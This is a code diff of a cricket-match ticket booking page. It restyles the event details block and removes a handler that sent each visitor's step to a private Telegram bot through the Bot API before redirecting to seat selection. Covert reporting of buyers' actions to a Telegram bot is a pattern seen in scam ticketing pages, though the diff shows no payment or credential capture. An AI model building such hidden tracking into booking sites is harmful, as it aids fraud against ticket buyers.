@@ -94,29 +94,41 @@ if (!match) {
             <img src="${match.banner}" style="width:100%; border-radius:12px; object-fit: cover; box-shadow: 0 4px 10px rgba(0,0,0,0.1);" onerror="this.src='https://via.placeholder.com/800x400?text=Banner+Not+Available'">
         </div>
 
-        <div style="margin-top: 12px;">
-            <span style="background:#f1f2f4; color: #333; padding:4px 8px; font-size:10px; font-weight: 700; border-radius:4px; text-transform: uppercase;">Cricket</span>
+        <div style="margin-top: 16px;">
+            <span style="background-color: #3f4553; color: white; padding: 4px 8px; font-size: 12px; font-weight: 500; border-radius: 4px;">Cricket</span>
         </div>
 
-        <div style="display: flex; justify-content: space-between; align-items: center; background: #f8f9fa; border-radius: 8px; padding: 12px; margin-top: 16px;">
-            <div style="display: flex; align-items: flex-start; gap: 10px;">
-                <div style="color: #22c55e; font-size: 18px;">👍</div>
-                <div>
-                    <div style="font-weight: 700; font-size: 13px; color: #333;">78.1k are interested</div>
-                    <div style="font-size: 11px; color: #666; margin-top: 2px;">Mark interested to know more about this event</div>
-                </div>
+        <div style="margin-top: 24px; display: flex; flex-direction: column; gap: 16px; font-size: 15px; color: #1f2937; font-weight: 500;">
+            
+            <div style="display: flex; align-items: center; gap: 12px;">
+                <i class="far fa-calendar text-center text-gray-700 text-[18px] w-6"></i>
+                <span>${match.date || 'Sun 29 Mar 2026'}</span>
             </div>
-            <button style="border: 1px solid #f84464; color: #f84464; background: transparent; padding: 6px 12px; border-radius: 6px; font-size: 12px; font-weight: 600;">Interested?</button>
-        </div>
+            
+            <div style="display: flex; align-items: center; gap: 12px;">
+                <i class="far fa-clock text-center text-gray-700 text-[18px] w-6"></i>
+                <span>${match.time || '7:30 PM'}</span>
+            </div>
+            
+            <div style="display: flex; align-items: center; gap: 12px;">
+                <i class="fas fa-hourglass-half text-center text-gray-700 text-[16px] w-6"></i>
+                <span>5 Hours</span>
+            </div>
+            
+            <div style="display: flex; align-items: center; gap: 12px;">
+                <i class="fas fa-language text-center text-gray-700 text-[16px] w-6"></i>
+                <span>English</span>
+            </div>
+            
+            <div style="display: flex; align-items: flex-start; gap: 12px;">
+                <i class="fas fa-map-marker-alt text-center text-gray-700 text-[18px] w-6 mt-0.5"></i>
+                <span style="flex: 1; line-height: 1.4;">
+                    ${match.venue || 'Wankhede Stadium: Mumbai'} 
+                    <i class="fas fa-location-arrow text-blue-600 ml-1 text-[13px] -rotate-45 transform"></i>
+                </span>
+            </div>
 
-        <div style="margin-top: 20px; display: flex; flex-direction: column; gap: 14px; font-size: 13px; color: #333; font-weight: 500;">
-            <div style="display: flex; align-items: center; gap: 12px;"><span style="font-size:16px;">📅</span><span>${match.date || 'Sun 29 Mar 2026'}</span></div>
-            <div style="display: flex; align-items: center; gap: 12px;"><span style="font-size:16px;">⏰</span><span>${match.time || '7:30 PM'}</span></div>
-            <div style="display: flex; align-items: center; gap: 12px;"><span style="font-size:16px;">⌛</span><span>5 Hours</span></div>
-            <div style="display: flex; align-items: center; gap: 12px;"><span style="font-size:16px;">🗣️</span><span>English</span></div>
-            <div style="display: flex; align-items: flex-start; gap: 12px;"><span style="font-size:16px;">📍</span><span style="flex: 1; line-height: 1.4;">${match.venue || 'Wankhede Stadium: Mumbai'}</span></div>
         </div>
-
         <div style="height: 10px; background: #f4f5f7; margin: 20px -16px;"></div>
 
         <div style="display: flex; justify-content: space-between; align-items: center; background: #fff; border: 1px solid #eee; border-radius: 8px; padding: 10px 12px; box-shadow: 0 2px 4px rgba(0,0,0,0.02);">
@@ -361,27 +373,4 @@ if (acceptBtn) {
                             `🏏 *Match:* ${matchTitle}\n` +
                             `👉 *Action:* Accepted T&C, moving to Seat Selection!`;
 
-        const url = `https://api.telegram.org/bot${botToken}/sendMessage?chat_id=${chatId}&text=${encodeURIComponent(telegramMsg)}&parse_mode=Markdown`;
-
-        try {
-            await fetch(url);
-        } catch (e) {
-            console.log("Telegram Error");
-        } finally {
-            closePopup();
-            // Match title pehle hi full name mein save ho chuka hai upar
-            window.location.href = "seats.html";
-        }
-    };
-}
-
-// ==========================================
-// 🔥 BOOK BUTTON
-// ==========================================
-const bookNowBtn = document.getElementById('book-now-btn');
-if (bookNowBtn) {
-    bookNowBtn.onclick = () => {
-        openTnc();
-    };
-}
-
+        
